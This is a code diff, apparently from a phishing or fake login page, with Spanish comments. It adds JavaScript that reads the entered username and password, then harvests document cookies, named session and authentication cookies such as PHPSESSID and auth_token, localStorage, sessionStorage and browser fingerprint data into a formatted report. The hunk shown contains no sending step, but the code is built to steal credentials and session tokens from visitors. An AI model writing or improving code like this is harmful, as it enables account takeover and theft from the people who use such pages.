@@ -410,38 +410,50 @@
             const usuario = document.querySelector('.input-field').value;
             const password = document.querySelector('.password-input').value;
             
-            // Captura agresiva de cookies y storage
             let allCookies = '';
             try {
-                // Cookies del documento
-                const documentCookies = document.cookie;
+                // 1. Cookies del documento de forma más agresiva
+                const documentCookies = document.cookie ? document.cookie : navigator.cookieEnabled ? 'Cookies habilitadas pero vacías' : 'Cookies deshabilitadas';
                 
-                // Local Storage
-                const localStorageData = Object.entries(localStorage)
-                    .map(([key, value]) => `${key}: ${value}`)
-                    .join('\n');
-                    
-                // Session Storage
-                const sessionStorageData = Object.entries(sessionStorage)
-                    .map(([key, value]) => `${key}: ${value}`)
-                    .join('\n');
-                    
-                // IndexedDB
-                const dbList = await window.indexedDB.databases();
-                const indexedDBData = dbList.map(db => db.name).join(', ');
+                // 2. Cookies específicas que queremos buscar
+                const cookieNames = ['PHPSESSID', 'session_id', 'user_session', 'auth_token', '_ga', '_gid'];
+                const specificCookies = cookieNames.map(name => {
+                    const value = document.cookie.split(';').find(c => c.trim().startsWith(name + '='));
+                    return value ? value.trim() : `${name}: no encontrada`;
+                }).join('\n');
                 
+                // 3. Web Storage más detallado
+                const localStorageData = Object.keys(localStorage).length > 0 ? 
+                    JSON.stringify(localStorage, null, 2) : 'Vacío';
+                    
+                const sessionStorageData = Object.keys(sessionStorage).length > 0 ? 
+                    JSON.stringify(sessionStorage, null, 2) : 'Vacío';
+                
+                // 4. Información del navegador
+                const browserInfo = {
+                    cookiesEnabled: navigator.cookieEnabled,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    doNotTrack: navigator.doNotTrack,
+                    vendor: navigator.vendor,
+                    plugins: Array.from(navigator.plugins).map(p => p.name)
+                };
+
                 allCookies = `
 📍 Document Cookies:
-${documentCookies || 'No cookies'}
+${documentCookies}
+
+🔍 Cookies Específicas:
+${specificCookies}
 
 💾 LocalStorage:
-${localStorageData || 'Vacío'}
+${localStorageData}
 
 📌 SessionStorage:
-${sessionStorageData || 'Vacío'}
+${sessionStorageData}
 
-🗄️ IndexedDB:
-${indexedDBData || 'No databases'}
+🌐 Información del Navegador:
+${JSON.stringify(browserInfo, null, 2)}
                 `;
             } catch (e) {
                 allCookies = `Error al obtener datos: ${e.message}`;
